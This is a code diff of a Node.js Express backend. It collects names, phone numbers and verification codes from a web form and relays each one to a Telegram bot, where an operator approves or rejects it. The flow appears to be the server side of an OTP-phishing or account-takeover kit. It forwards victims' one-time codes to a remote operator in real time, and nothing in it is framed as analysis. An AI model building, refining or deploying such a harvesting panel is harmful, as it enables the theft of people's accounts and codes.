@@ -2,12 +2,11 @@ require('dotenv').config();
 const express = require('express');
 const axios = require('axios');
 const { v4: uuidv4 } = require('uuid');
-const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// ---------------- BACKEND DOMAIN ----------------
+// ---------------- DOMAIN ----------------
 const BACKEND_DOMAIN = 'https://sendwave-9mid.onrender.com';
 
 // ---------------- MEMORY STORE ----------------
@@ -31,7 +30,7 @@ Object.keys(process.env).forEach(key => {
     }
 });
 
-console.log('✅ Bots loaded:', bots.map(b => b.botId));
+console.log("✅ Bots loaded:", bots.map(b => b.botId));
 
 // ---------------- MIDDLEWARE ----------------
 app.use(express.json());
@@ -43,15 +42,13 @@ function getBot(botId) {
     return bots.find(b => b.botId === botId);
 }
 
-// ---------------- TELEGRAM ----------------
-async function sendTelegramMessage(bot, text, keyboard = []) {
+async function sendTelegramMessage(bot, text) {
     try {
         await axios.post(
             `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
             {
                 chat_id: bot.chatId,
-                text,
-                reply_markup: { inline_keyboard: keyboard }
+                text
             }
         );
     } catch (err) {
@@ -72,13 +69,11 @@ async function answerCallback(bot, id) {
 
 // ---------------- WEBHOOK SETUP ----------------
 async function setWebhook(bot) {
-    const url = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;
-
     try {
         await axios.get(
-            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${url}`
+            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`
         );
-        console.log(`Webhook set: ${bot.botId}`);
+        console.log("Webhook set:", bot.botId);
     } catch (err) {
         console.error("Webhook error:", err.message);
     }
@@ -91,15 +86,11 @@ async function initWebhooks() {
     console.log("✅ Webhooks initialized");
 }
 
-// ---------------- ✅ ENTRY POINT (FIXED) ----------------
+// ---------------- ENTRY ROUTE ----------------
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
+    if (!bot) return res.status(404).send("Invalid bot");
 
-    if (!bot) {
-        return res.status(404).send('Invalid bot link');
-    }
-
-    // IMPORTANT: entry page keeps botId
     res.redirect(`/index.html?botId=${bot.botId}`);
 });
 
@@ -108,20 +99,15 @@ app.post('/submit-phone', (req, res) => {
     const { name, phone, botId } = req.body;
 
     const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+    if (!bot) return res.status(400).json({ error: "Invalid bot" });
 
     const requestId = uuidv4();
-
     approvedPhones[requestId] = null;
     requestBotMap[requestId] = botId;
 
     sendTelegramMessage(
         bot,
-        `📱 PHONE REQUEST\n\nName: ${name}\nPhone: ${phone}`,
-        [[
-            { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
-            { text: '❌ Reject', callback_data: `phone_bad:${requestId}` }
-        ]]
+        `📱 PHONE REQUEST\nName: ${name}\nPhone: ${phone}`
     );
 
     res.json({ requestId });
@@ -138,20 +124,15 @@ app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
 
     const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+    if (!bot) return res.status(400).json({ error: "Invalid bot" });
 
     const requestId = uuidv4();
-
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
 
     sendTelegramMessage(
         bot,
-        `🔑 CODE REQUEST\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
-        [[
-            { text: '✅ Approve', callback_data: `code_ok:${requestId}` },
-            { text: '❌ Reject', callback_data: `code_bad:${requestId}` }
-        ]]
+        `🔑 CODE REQUEST\nName: ${name}\nPhone: ${phone}\nCode: ${code}`
     );
 
     res.json({ requestId });
@@ -163,7 +144,7 @@ app.get('/check-code/:requestId', (req, res) => {
     });
 });
 
-// ---------------- TELEGRAM WEBHOOK ----------------
+// ---------------- TELEGRAM WEBHOOK (FIXED + FEEDBACK) ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.sendStatus(404);
@@ -171,15 +152,36 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const cb = req.body.callback_query;
     if (!cb) return res.sendStatus(200);
 
+    console.log("📩 CALLBACK:", cb.data);
+
     const [action, requestId] = cb.data.split(':');
 
-    if (!requestId) return res.sendStatus(200);
+    if (!requestId) {
+        console.log("❌ Missing requestId");
+        return res.sendStatus(200);
+    }
 
-    if (action === 'phone_ok') approvedPhones[requestId] = true;
-    if (action === 'phone_bad') approvedPhones[requestId] = false;
+    // PHONE
+    if (action === 'phone_ok') {
+        approvedPhones[requestId] = true;
+        await sendTelegramMessage(bot, `✅ Phone APPROVED: ${requestId}`);
+    }
 
-    if (action === 'code_ok') approvedCodes[requestId] = true;
-    if (action === 'code_bad') approvedCodes[requestId] = false;
+    if (action === 'phone_bad') {
+        approvedPhones[requestId] = false;
+        await sendTelegramMessage(bot, `❌ Phone REJECTED: ${requestId}`);
+    }
+
+    // CODE
+    if (action === 'code_ok') {
+        approvedCodes[requestId] = true;
+        await sendTelegramMessage(bot, `✅ Code APPROVED: ${requestId}`);
+    }
+
+    if (action === 'code_bad') {
+        approvedCodes[requestId] = false;
+        await sendTelegramMessage(bot, `❌ Code REJECTED: ${requestId}`);
+    }
 
     await answerCallback(bot, cb.id);
 
